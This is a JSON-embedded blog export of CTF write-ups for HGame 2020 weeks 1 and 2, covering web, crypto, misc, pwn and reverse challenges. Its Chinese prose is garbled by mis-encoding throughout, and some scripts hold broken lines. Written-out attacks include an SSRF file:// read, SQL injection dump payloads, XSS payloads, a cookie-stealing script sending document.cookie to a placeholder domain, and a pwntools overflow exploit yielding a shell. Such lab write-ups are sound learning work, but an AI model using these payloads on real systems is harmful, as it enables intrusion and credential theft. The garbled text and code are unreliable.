å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡,æƒ³ç€$GLOBALSèƒ½æ‰“å°å‡ºæˆ‘ä»¬æ‰€éœ€è¦çš„usernameä¸password,äºæ˜¯ä¼ å…¥\n```\nhttp://cosmos-admin.hgame.day-day.work/?action=login.php&debug=GLOBALS\n```\nå‡ºç°\n![](wp2_img/02.png)\nä»\n```\n$admin_password == md5($_POST['password']) \n```\nå¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªå¼±æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ä¼ å…¥md5å¼€å¤´æ˜¯0eçš„å­—ç¬¦ä¸²,0eåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å…¶è§†ä½œä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥æ— è®º0eåé¢æ˜¯ä»€ä¹ˆï¼Œ0çš„å¤šå°‘æ¬¡æ–¹è¿˜æ˜¯0  \næˆåŠŸç™»å…¥ä¹‹åå†çœ‹ä¸‹admin.phpçš„æºç \n```php\n<?php\ninclude \"config.php\";\nsession_start();\nif(!isset($_SESSION['username'])) {\n    header('Location: index.php');\n    exit();\n}\n\nfunction insert_img() {\n    if (isset($_POST['img_url'])) {\n        $img_url = @$_POST['img_url'];\n        $url_array = parse_url($img_url);\n        if (@$url_array['host'] !== \"localhost\" && $url_array['host'] !== \"timgsa.baidu.com\") {\n            return false;\n        }   \n        $c = curl_init();\n        curl_setopt($c, CURLOPT_URL, $img_url);\n        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);\n        $res = curl_exec($c);\n        curl_close($c);\n        $avatar = base64_encode($res);\n\n        if(filter_var($img_url, FILTER_VALIDATE_URL)) {\n            return $avatar;\n        }\n    }\n    else {\n        return base64_encode(file_get_contents(\"static/logo.png\"));\n    }\n}\n?>\n```\næ„æ€æ˜¯è¦ä¼ å…¥ä¸€ä¸ªurlä¸”å¿…é¡»ä»localhostæˆ–è€…timgsa.baidu.comå¼€å§‹  \ncurlæœ‰httpå’Œfileä¸¤ç§åè®®ï¼Œå½“\n```url=file://www.baidu.com/etc/passwd```\næ—¶,ä¼šç›´æ¥è¯»å–/etc/passwordçš„å†…å®¹ï¼Œé¢˜ç›®è¯´æ˜äº†flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥åœ¨å›¾ç‰‡urlå¤„æ’å…¥\n```file://localhost/flag```ï¼Œç„¶åç”¨burpsuiteå€ŸåŒ…æŸ¥çœ‹è¿”å›çš„base64å€¼\n\n### Cosmosçš„ç•™è¨€æ¿-1\nå…ˆæµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†selectå’Œç©ºæ ¼\n[sqlæ³¨å…¥_è¿‡æ»¤ç©ºæ ¼å’Œæ³¨é‡Šç¬¦](https://www.cnblogs.com/peterpan0707007/p/7501507.html)\nselectå¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡ï¼Œç©ºæ ¼å¯ä»¥ç”¨/\\*\\*/ä»£æ›¿,çˆ†è¡¨```'/**/union/**/select/**/concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having'1'='1```\nå¾—åˆ°:f1aggggggggggggg  \nçˆ†æ®µå\n```'/**/union/**/seLect/**/concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='f1aggggggggggggg'/**/having/**/'1'='1```\nå¾—åˆ°:fl4444444g\nçˆ†å€¼\n```'/**/union/**/seLect/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having/**/'1'='1```\n### Cosmosçš„æ–°è¯­è¨€\n\n```\n<?php\nhighlight_file(__FILE__);\n$code = file_get_contents('mycode');\neval($code);\n\n\nJzgCoycIGwIBr0qhJ1IQn05IoQWnoxb1GyuFryOLJ2cBEIV2G2gXZ05LFw4=\n```\nqwqå±…ç„¶è®¿é—®/mycodeå°±å¯ä»¥å¾—åˆ°æºç \n```php\nfunction encrypt($str){\n    $result = '';\n    for($i = 0; $i &lt; strlen($str); $i++){\n        $result .= chr(ord($str[$i]) + 1);\n    }\n    return $result;\n}\n\necho(encrypt(strrev(str_rot13(encrypt(base64_encode(strrev(strrev(str_rot13(base64_encode(base64_encode($_SERVER['token'])))))))))));\n\nif(@$_POST['token'] === $_SERVER['token']){\n    echo($_SERVER['flag']);\n}\n```\næ„æ€å°±æ˜¯å‘é€çš„tokenè¦å’Œè§£å¯†åçš„serverçš„tokenä¸€è‡´,ä½†æ˜¯å‘ç°æ¯åˆ·æ–°ä¸€æ¬¡ï¼ŒåŠ å¯†çš„æ–¹æ³•ä¸é¡ºåºéƒ½ä¼šå˜ï¼Œæ‰€ä»¥è¦å†™è„šæœ¬æ¥å®ç°è§£å¯†ï¼Œæ€è·¯æ˜¯å¾—åˆ°æºç ä¸­å¯¹tokenåŠ å¯†çš„è¿™ä¸€è¡Œï¼Œå†é€šè¿‡å­—ç¬¦ä¸²æ¯”è¾ƒåˆ¤æ–­æ‰€ä½¿ç”¨çš„å‡½æ•°  \n[python3ç½‘ç»œçˆ¬è™«å¼€å‘å®æˆ˜](https://python3webspider.cuiqingcai.com/)\n(ä»€ä¹ˆéƒ½ä¸ä¼šçš„æ„Ÿè§‰å¤ªæƒ¨äº†= =)  \né¡ºæ‰‹è´´ä¸€ä¸ªå°è¯­çš„wpæ¥å­¦ä¹ qwq  \n[Hgame-week2-writeup](http://www.xi4oyu.top/1966f4b8/#more)\nå†™è„šæœ¬(ç…§æŠ„å°è¯­çš„)- -å¤§æ¦‚å°±æ˜¯ç»™è‡ªå·±åŠ æ·±ä¸‹å°è±¡çš„...\nä¸çŸ¥é“ä¸ºå•¥= =è¯•äº†å¥½å‡ æ¬¡éƒ½ä¸è¡Œï¼Œå‡ºç°å„ç§é”™è¯¯ï¼Œåæ¥çªç„¶åˆè¡Œäº†...\n```python\n#py3\nfrom lxml import etree\nfrom requests import Session\nimport re\nimport base64\n\nse=Session()\n\n#get the encode\nurl='http://c339168464.php.hgame.n3ko.co/'\nr = se.get(url)\nhtml = etree.HTML(r.text)\nenc_code=html.xpath('//html/body/text()')[0]\n\n#get the method\n_url='http://c339168464.php.hgame.n3ko.co/mycode'\n_r=se.get(_url)\n_html = etree.HTML(_r.text)\np = r'echo\\((.*)\\(\\$_SERVER'#è½¬ä¹‰å­—ç¬¦r,é€šè¿‡æ­£åˆ™é€‰å–èŒƒå›´\nmethod=re.search(p,_r.text).group(1).split('(')\n\ndef rot13(s):\n    result = \"\"\n    for v in s:\n        c = ord(v)\n        if c >= ord('a') and c <= ord('z'):\n            if c > ord('m'):\n                c -= 13\n            else:\n                c += 13\n        elif c >= ord('A') and c <= ord('Z'):\n            if c > ord('M'):\n                c -= 13\n            else:\n                c += 13\n        result += chr(c)\n    return result\n\ndef decrypt(s):\n    res=''\n    for ch in s:\n        res+=chr(ord(ch)-1)\n    return res\n\nfor m in method:\n    if m == 'base64_encode':\n        enc_code=base64.b64decode(enc_code)\n    elif m =='encrypt':\n        enc_code=decrypt(enc_code)\n    elif m =='str_rot13':\n        enc_code=rot13(enc_code)\n    elif m == 'strrev':\n        enc_code=enc_code[::-1]\n\n#get the response\nr_=se.post('http://c339168464.php.hgame.n3ko.co/',data={'token': enc_code})\nflag=r_.text\nprint(flag)\n```\n### Cosmosçš„èŠå¤©å®¤\nç‚¹å‡»Flag is hereçš„buttonåï¼Œå‡ºç°æç¤º\n![](wp2_img/03.png)\né‚£ä¹ˆåº”è¯¥æ˜¯é€šè¿‡xssè·å–ç®¡ç†å‘˜cookie\n[ctf_web_cookieçªƒå–](https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#cookies)\nå½“æˆ‘ä»¬è¾“å…¥æ ‡ç­¾<\\img\\>æ—¶ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°æ ‡ç­¾è¢«è¿‡æ»¤ï¼Œé€šè¿‡\n```\n<!--\n```\næ³¨é‡Šæ‰åé¢çš„<span>,è€Œæµè§ˆå™¨çš„å®¹é”™æ€§å…è®¸æˆ‘ä»¬æœ€åä¸ç”¨åŠ >æ¥é—­åˆæ ‡ç­¾\n[Xsså°æ¸¸æˆé€šå…³ç§˜ç±](https://zhuanlan.zhihu.com/p/75619278)\n[xssç»ƒä¹ è®°å½•](https://www.kingkk.com/2018/08/xss%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/)\näºæ˜¯æˆ‘ä»¬å‘é€\n```\n<img src=x onerror=\"alert(1)\"<!--\n```\næºä»£ç ä¸­æ˜¾ç¤º![](wp2_img/04.png)\nå‘ç°è¿™ä¸ªalertå˜å¤§å†™äº†ï¼Œé‡‡ç”¨htmlå®ä½“ç¼–ç ç»•è¿‡(å¯¹alertè¿›è¡Œunicodeç¼–ç )\n```\n<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#49;&#34;&#41;\"<!--\n```\nå‘ç°å¯ä»¥æˆåŠŸæ‰§è¡Œã€‚\nå¯¹äºmd5(code)[:6] == 11036fæ¥è¯´ï¼Œè¦æ±‚md5å€¼çš„å‰å…­ä½è¦åšåˆ°ç›¸ç­‰ã€‚\n[Hgame-2020â€”â€”WEB](http://www.pdsdt.lovepdsdt.com/index.php/2020/02/04/hgame-2020-web/#Cosmos-3)\nå¯¹éªŒè¯ç æœ‰\n```python\n#py3\nimport hashlib\n\nfor i in range(1, 100000000):\n    #s = hashlib.md5(str(i)).hexdigest()[0:8]\n    #s = hashlib.md5(str(i)).hexdigest()[:6]\n    s = hashlib.md5(str(i).encode(\"utf-8\")).hexdigest()[0:6]\n    if s == \"db97b8\":\n        print(i)\n        break\n```\n[hgame2020week2_offical](https://github.com/vidar-team/Hgame2020_writeup/tree/master/week2)\nä¹‹åå°±ç›´æ¥çœ‹å®˜æ–¹wpäº†- -è¿˜æœ‰å°è¯­çš„wp(é å°è¯­wpè¿‡æ—¥å­)\nå…¶å®éªŒè¯ç åº”è¯¥æ˜¯7-8ä½(- -ä»¥æˆ‘æœ‰é™çš„æ ·æœ¬æ¥è¯´)  \n[xiaoyuçš„wp](http://www.xi4oyu.top/1966f4b8/)  \nå…³äº\n```\n(function(){\n    var img = new Image();\n    img.src='http://æˆ‘çš„åŸŸå/?token='+document.cookie;\n})();\n```\næœ‰\n[Document.cookie](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie)","tags":["vidar"]},{"title":"hgame2020week1_wp","url":"/2020/01/25/hgame2020week1-wp/","content":"  \næ„Ÿè°¢å‡ºé¢˜äººçš„è€å¿ƒè§£ç­”...  \n= =å¯æƒœå¤§äºŒäº†æ‰åˆšåˆšå¼€å§‹....  \npyå‡ºé¢˜äººè™½ç„¶å¯è€»ä½†æœ‰ç”¨(X\n\n## web  \n### Cosmosçš„åšå®¢  \n![](01.png)\n.gitæºç æ³„éœ²   \npayloadï¼šhttp://cosmos.hgame.n3ko.co/.git/config  \n![](03.png)\næŠŠgithubä¸Šçš„ä»“åº“git cloneä¸‹æ¥å†è¿›è¡Œå›æ»š  \ngit clone https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc  \ncd 8LTUKCL83VLhXbc  \ngit log  \n![](04.png)\ncommit åé¢å°±æ˜¯å¯¹åº”çš„ç‰ˆæœ¬id  \n![](05.png)\nBase64è§£ç ä¹‹åå°±å¯ä»¥å¾—åˆ°flag\n\n### æ¥å¤´éœ¸ç‹  \nçœ‹è§é¢˜ç›®å°±æƒ³åˆ°è¯·æ±‚å¤´ï¼Œç”¨postmanä¸€æ­¥æ­¥è¿›è¡Œä¿®æ”¹\n![](06.png)\næ ¹æ®æç¤ºåœ¨è¯·æ±‚å¤´ä¸­ä¸€æ­¥æ­¥æ·»åŠ   \nreferer:https://vidar.club/  \nX-Forwarded-For:127.0.0.1(You need to visit locally)  \nUser-Agentï¼šMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cosmos/78.0.3904.108 Safari/537.36(use Cosmos Brower)\nä¹‹åæç¤º\n![](11.png)\nçœ‹ä¸€ä¸‹å“åº”å¤´\n![](12.png)\n![](08.png)\nå› ä¸ºè¯·æ±‚æ–¹å¼æ˜¯POSTï¼Œæ‰€ä»¥ if-Unmodified-Since:Tue,15 Nov 2099 00:00:00 GMT  \n\n### Code World  \nf12çœ‹æºç \n![](14.png)\nå‘ç°æç¤ºï¼Œç”¨burpsuiteæŠ“åŒ…\n![](15.png)  \n![](45.png)\n405æ˜¯æŒ‡method not allowedï¼Œæ‰€ä»¥æŠŠgetæ”¹æˆpost\n![](17.png)\nå› ä¸º+ä¼šè¢«å½“ä½œç©ºæ ¼å¤„ç†ï¼Œæ‰€ä»¥ç”¨urlçš„%2b\n![](18.png)\n\n### é¸¡å°¼æ³°ç«  \nå‘ç°æ˜¯ä¸ªå°æ¸¸æˆï¼Œå…ˆç©ä¸€ä¸‹ï¼Œè¾“æ‰ä¹‹åå‘ç°æœ‰æç¤ºï¼šç§¯åˆ†è¾¾åˆ°30000æ‰èƒ½æ‹¿åˆ°flag  \nF12çœ‹ä¸€ä¸‹æºç \n![](13.png)\nåœ¨consoleä¸­ç›´æ¥è¾“å…¥storageScore=30000;globalScore=30000ï¼Œè¦†ç›–åŸå€¼  \nå†å¼€å§‹ç©æ¸¸æˆï¼Œç›´æ¥è¾“æ‰ä¹‹åç§¯åˆ†è¶…è¿‡30000äº†ï¼Œå°±å¯ä»¥çœ‹åˆ°flag\n\n## Misc  \n### æ¬¢è¿å‚åŠ HGameï¼  \nçœ‹è¿™ä¸ªå­—ç¬¦ä¸²ä»¥ä¸ºæ˜¯ä»€ä¹ˆç‰¹æ®Šçš„ç¼–ç ï¼Œgoogleæœä¸åˆ°å°±ç™¾åº¦ä¸€ä¸‹  \nç”¨base64è§£ç ï¼Œè§£å‡ºæ¥æ˜¯morseç ï¼Œå†åœ¨çº¿è§£ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flag  \n### å£çº¸  \nwinhexæ‰“å¼€åå‘ç°å«æœ‰flag.txtæ–‡ä»¶å¹¶ä¸”å°¾éƒ¨æœ‰æç¤ºï¼špasssword is picture ID  \nåæ¥æ‰çŸ¥é“è¿™ä¸ªidæŒ‡çš„æ˜¯pç«™ä¸Šçš„å›¾ç‰‡idâ€¦  \nå›¾ç‰‡é‡Œæœ‰ä¸ªå‹ç¼©åŒ…(PKå¼€å¤´)  \nforemost å›¾ç‰‡å.jpg  \nåˆ†ç¦»å¾—åˆ°ä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ…ï¼Œè¾“å…¥å›¾ç‰‡id  \ntxté‡Œæ˜¯unicodeç ï¼Œåœ¨çº¿è§£ç ä¸‹å¾—åˆ°flag   \n### å…‹è‹é²ç¥è¯  \næ‰“å¼€bacon.txtï¼Œçœ‹åå­—æ˜¯åŸ¹æ ¹åŠ å¯†  \n![](22.png)\næ ¹æ®è¿™ä¸ªè§£å¯†ï¼Œå¾—åˆ°flaghiddenindocè¿™ä¸ªæç¤ºï¼Œä½†æ˜¯è¿™ä¸ªä¸æ˜¯å¯†ç   \nåæ¥æœç´¢åˆ°æ˜æ–‡æ”»å‡»ï¼Œç”¨zipä¸è¡Œæ‰€ä»¥ç”¨7z  \nè§£å‹åå¾—åˆ°ä¸€ä¸ªdocæ–‡ä»¶ï¼Œé€‰æ‹©éšè—æ–‡å­—åŠŸèƒ½flagå°±å¯ä»¥æ˜¾ç¤ºäº†    \n### ç­¾åˆ°é¢˜ProPlus  \næ ¹æ®æç¤ºè¿›è¡Œæ …æ è§£å¯†ï¼Œå‡¯æ’’è§£å¯†ï¼Œå¯†ç ä¸ºå¤§å†™\n![](23.png)\nè§£å‹ä¹‹åå¾—åˆ°OK.txtï¼Œåœ¨çº¿okkè§£ç ï¼Œå‘ç°base32çš„æç¤ºï¼Œbase32è§£ç åå†base64ï¼Œå†è½¬æ¢ä¸ºæ–‡æœ¬ï¼Œå‘ç°å¼€å¤´æ˜¯pngï¼Œäºæ˜¯è½¬æˆ16è¿›åˆ¶ï¼Œå¤åˆ¶è¿›winhexä¿å­˜ä¸ºpngå¯å¾—äºŒç»´ç ï¼Œæ‰«ä¸€ä¸‹å°±æœ‰flagäº†  \n### æ¯æ—¥æ¨è  \nï¼ˆæ„Ÿè°¢å‡ºé¢˜äººçš„è€å¿ƒè§£ç­”qwqï¼‰  \nï¼ˆä¸€å¼€å§‹ç›´æ¥ç”¨foremoståˆ†ç¦»æ–‡ä»¶ï¼Œå†winrarä¿®å¤æ–‡ä»¶æ˜¯ä¸è¡Œçš„â€¦ï¼‰  \né€šè¿‡foremostå¯ä»¥çœ‹åˆ°é‡Œè¾¹æœ‰zipæ–‡ä»¶  \nåœ¨wiresharké‡Œæ‰“å¼€åï¼Œæœç´¢zipï¼Œæ‰¾åˆ°äº†å¯¹åº”çš„åŒ…  \n![](26.png)\nå¯¼å‡ºåå‘ç°æœ‰æç¤ºå¯†ç ä¸ºå…­ä½æ•°å­—ï¼Œç”¨AAPRçˆ†ç ´å¾—åˆ°å¯†ç   \nè§£å‹åå¾—åˆ°ä¸€ä¸ªmp3æ–‡ä»¶ï¼Œç”¨audacityæ‰“å¼€ï¼Œç›®æµ‹ä¸€ä¸‹æ³¢å½¢æ²¡ä»€ä¹ˆå¥‡æ€ªçš„åœ°æ–¹ï¼ˆè¿˜æŒºå¥½å¬\nå†çœ‹çœ‹é¢‘è°±å›¾å¾—åˆ°flag  \n## Crypto  \n### infantRSA  \nç»™å‡ºæ•°æ®å¦‚ä¸‹  \np = 681782737450022065655472455411;  \nq = 675274897132088253519831953441;  \ne = 13;  \nc=pow(m,e,p * q)=275698465082361070145173688411496311542172902608559859019841  \n![](24.png)\næ‰€ä»¥å·²çŸ¥pqecçš„è¯å…ˆæ±‚å‡ºdï¼Œå†æ±‚må°±å¥½  \n```python\nimport gmpy2\n\np=681782737450022065655472455411\nq=675274897132088253519831953441\ne=13\nc=275698465082361070145173688411496311542172902608559859019841\ns=(p-1)*(q-1)\nd=long(gmmpy2.invert(e,s))\nn=p*q\nm=pow(c,d,n)\nres=m.to_bytes(m.bit_length(),byteorder='big')\nprint(res)\n```\n### Affine\nè¿™é¢˜ç›´æ¥æ”¹äº†ç½‘ä¸Šçš„è„šæœ¬  \na.b.flagéƒ½æ˜¯æœªçŸ¥çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“å¯†æ–‡å’Œæ˜æ–‡ä¸­çš„hgameï¼Œäºæ˜¯å…ˆæ±‚aå’Œb\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\n\npre=[12,11,7,6,18]\npost=[46,33,43,30,0]\nfor a in range(MOD):\n\tif GCD(a,MOD)!=1:\n\t\tcontinue\n\tinv_a=inverse(a,MOD)\n\tfor b in range(MOD):\n\t\tq=1\n\t\tfor i in range(5):\n\t\t\tif(inv_a*(post[i]-b))%MOD!=pre[i]:\n\t\t\t\tq=0\n\t\t\t\tbreak\n\t\tif(q):\n\t\t\tprint(a,b)\n\t\t\t#13,14\n```\nabæ±‚å‡ºåå¯ä»¥æ±‚å¾—å®Œæ•´çš„æ˜æ–‡\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\na=13\nb=14\ninv_a=inverse(a,MOD)\ncipher='A8I5z{xr1A_J7ha_vG_TpH410}'\nflag=''\nfor p in cipher:\n\ti=TABLE.find(p)\n\tif i==-1:\n\t\tflag+=p\n\telse:\n\t\tii=(inv_a*(i-b))%MOD\n\t\tflag+=TABLE[ii]\nprint(flag)\n```\n### Reorder\nè¿™é¢˜ä¸€å¼€å§‹æ˜¯çœŸçš„æ‡µæ¯”â€¦..åæ¥é—®äº†ä¸€ä¸‹lurk  \nå‘ç°è¾“å…¥æŸä¸ªå­—ç¬¦åï¼Œè¿”å›åçš„å­—ç¬¦æ‰€åœ¨ä½ç½®å°±æ˜¯æ‰€å¯¹åº”çš„å¯†æ–‡  \n![](00.png)\nè¾“å…¥  \n0  \n00  \n000  \n0000  \n00000  \nå‘ç°è¿”å›çš„ä½ç½®å’Œhgameç›¸å¯¹åº”ï¼Œä¹‹åä¸€ç›´æ·»åŠ è¾“å…¥æ•°é‡ï¼Œå†è§‚å¯Ÿæ¯æ¬¡æ–°å¢çš„ä½ç½®æ‰€å¯¹åº”çš„å­—ç¬¦å°±å¥½å•¦~  \n## PWN\n### Hard_AAAAA\næ„Ÿè°¢Cè€æ¿çš„è€å¿ƒè§£ç­”ï¼Œé¡ºä¾¿æŠŠå‘éƒ½è¸©äº†ä¸€éâ€¦.  \nä¸‹è½½ä¹‹åå…ˆä¾‹å¸¸checksecï¼ˆæ„Ÿè§‰ä¿æŠ¤å¼€æ²¡å¼€å…¶å®å½±å“ä¸æ˜¯å¾ˆå¤§â€¦..ä¹Ÿå¯èƒ½æ˜¯å› ä¸ºæˆ‘ä¸æ‡‚ï¼‰ \nIdaå¯åŠ¨ï¼f5ï¼  \n![](31.png)\n![](32.png)\nå¯ä»¥é€šè¿‡gets()ä½¿å¾—sæº¢å‡ºè¦†ç›–v5çš„å€¼ï¼Œä»è€Œæ»¡è¶³ifå†…çš„æ¡ä»¶ï¼Œæ‰§è¡Œbackdoor()å‡½æ•°  \nsä¸v5çš„ç›¸å¯¹è·ç¦»ä¸º0xAC-0x31,è¿™ä¸€æ®µç”¨éšä¾¿ä»€ä¹ˆæ•°æ®å¡«å……:â€™aâ€™ * (0xAC-0x31)  \nä¹‹åè¦æ»¡è¶³memcmpçš„æ¡ä»¶å³memcmp(â€œ0O0oâ€,&v5,7u)==0  \nåœ¨7ä¸ªå†…å­˜å•å…ƒå†…ï¼Œv5èƒ½å’Œâ€œ0O0oâ€ç›¸ç­‰ï¼ˆâ€¦.æ²¡æ³¨æ„åˆ°7â€¦ï¼‰  \nåŒå‡»memcmpä¸­çš„â€œ0O0oâ€ï¼Œè·³è½¬  \n![](33.png)\nå‘ç°å’Œâ€O0â€ç›¸é‚»ï¼Œå°±æ˜¯è¯´æ¯”è¾ƒå®Œâ€œ0O0oâ€åä¼šç»§ç»­æ¯”è¾ƒâ€œO0â€  \næ‰€ä»¥æ„é€ payload=â€™aâ€™ * (0xAC-0x31)+â€™ 0O0o\\00O0â€™(ä¹‹å‰è¿˜æ‰“æˆäº†â€™0O0o\\\\\\00O0â€™,æˆ‘æ˜¯çœŸçš„è ¢)  \n```python\nfrom pwn import *\np=remote(\"47.103.214.163\",\"20000\")\np.recvuntil(\"Let's 0O0o\\\\0O0!\")\npayload='a'*(0xAC-0x31)+'0O0o\\00O0'\np.sendline(payload)\np.interactive()\n```\nè¿ä¸Šåè¾“å…¥lsæŸ¥çœ‹ç›®å½•ï¼Œå‘ç°æœ‰ä¸ªflagï¼Œå†cat flagè¯»å–å†…å®¹å°±å¥½äº†  \n## Reverse\n### maze\nIdaå¯åŠ¨ï¼f5ï¼  \n![](39.png)\nçŒœæµ‹æ˜¯æ–¹å‘é”®ï¼Œé€‰ä¸­æ•°å­—æŒ‰Råå°±ä¼šå˜æˆdswa(å¸¸ç”¨æ–¹å‘é”®)  \n![](40.png)\n![](41.png)\nä»£ç ç»™å‡ºäº†è¿·å®«èŒƒå›´(ä¸Šä¸‹é™)ä»¥åŠv5è¦èµ°çš„è·¯çº¿(0ä¸Š)  \nå…ˆçœ‹çœ‹v5çš„è¡Œèµ°èŒƒå›´ï¼Œå³è¿·å®«åœ°å›¾ï¼Œç‚¹è¿›unk_602080 \n\n![](42.png)  \n\né•¿è¿™æ ·ï¼Œé€‰ä¸­unk_602080å’Œunk_    60247Cé—´çš„å†…å®¹æŒ‰aå¯ä»¥ç®€å•åˆå¹¶ä¸€ä¸‹ï¼Œæ ‡è®°å¥½å‡ºå£å’Œå…¥å£ä½ç½®  \né€šè¿‡ä»£ç åˆ†æï¼Œä¸Šä¸‹ç§»åŠ¨å¯¹åº”64ä¸ªstepï¼Œå·¦å³å¯¹åº”4ä¸ªï¼Œæ‰€ä»¥åˆ é™¤æ‰å¤šä½™çš„æ•°æ®ï¼ˆæˆ‘æ˜¯æ‰‹åŠ¨åˆ â€¦.ï¼‰  \n![](44.png)\nå…¶ä¸­ä¸Šè¾¹çš„(0æ˜¯å…¥å£ï¼Œæœ€åçš„(0æ˜¯å‡ºå£ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°èµ°å‡ºè¿·å®«çš„è·¯å¾„  \nè¡Œèµ°çš„æ–¹å‘é”®åŠ ä¸Šhgame{}å°±æ˜¯flag\n","tags":["vidar"]}]